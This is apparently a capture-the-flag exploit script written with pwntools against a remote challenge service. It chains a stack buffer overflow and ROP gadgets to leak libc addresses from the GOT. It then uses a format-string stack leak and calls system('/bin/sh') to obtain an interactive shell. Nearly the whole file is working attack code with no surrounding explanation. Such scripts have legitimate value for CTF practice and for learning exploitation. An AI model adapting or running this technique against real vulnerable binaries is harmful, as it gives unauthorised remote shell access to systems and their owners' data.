from pwn import *

main = 0x40078b

prdi = 0x400000 + 0x000008e3
prsir15 = 0x400000 + 0x000008e1

fgets_got = 0x600c80
printf_got = 0x600c68
setvbuf_got = 0x600ca0
printf_plt = 0x4005f0
fgets_plt = 0x400620

setvbuf_off = 0x6c0a0
system_off = 0x41490

def su(x):
    return u64(x.ljust(8, "\x00"))

def do_leak(addr):
    payload = ("%9$sPIZA" + p64(addr)).ljust(0x818, "A")
    payload += p64(main)

    #print "leak: %#x"% addr

    r.sendline(payload)

    data = r.recv(timeout=5)
    if "PIZA" in data:
        data = data.split("PIZA")[0]
        if len(data) == 0:
            return "\x00"
        return data
    else:
        return "\x00"

r = remote("ctf.sharif.edu", 54514)

payload  = "A" * 0x818 
payload += p64(main) 
payload += p64(prdi) 
payload += p64(fgets_got) 
payload += p64(printf_plt)
payload += p64(main)

r.sendline(payload)

r.sendline("PIZA")
r.recvuntil("PIZA\n")

r.sendline("PIZA")
r.recvuntil("PIZA\n")

leak = r.recv(0x8)

libc_fgets = su(leak)
log.success("libc_fgets: %#x", libc_fgets)

payload  = "A" * 0x818
payload += p64(prdi)
payload += p64(setvbuf_got)
payload += p64(printf_plt)
payload += p64(main)

r.sendline(payload)
_ = r.recv(0x4000)

leak = r.recv(0x8)
libc_setvbuf= su(leak)
log.success("libc_setvbuf: %#x", libc_setvbuf)

libc_base = libc_setvbuf - setvbuf_off
log.success("libc_base: %#x", libc_base)

libc_system = libc_base + system_off

payload  = "A" * 0x818
payload += p64(prdi)
payload += p64(printf_got)
payload += p64(prsir15)
payload += p64(0x8)
payload += p64(0x0)
payload += p64(fgets_plt)
payload += p64(main)

#print "leak: %#x"% addr
#r.sendline(payload)

payload = ""
for i in range(30):
    payload += "%{}$p.".format(260 + i)

r.sendline(payload)
stack_leak = int(r.recvline().split(".")[20], 16)

payload = ("%9$sPIZA" + p64(stack_leak - 0x900)).ljust(0x800, "X")

payload = "/bin/sh;" * (0x818 / len("/bin/sh;"))
payload = payload.ljust(0x818, "A")
payload += p64(prdi)
payload += p64(stack_leak - 0x800)
payload += p64(libc_system)

r.sendline(payload)

'''
libc = DynELF(do_leak, libc_base)

system = libc.lookup('system')
log.success('found system: %#x', system)
'''

print r.interactive()
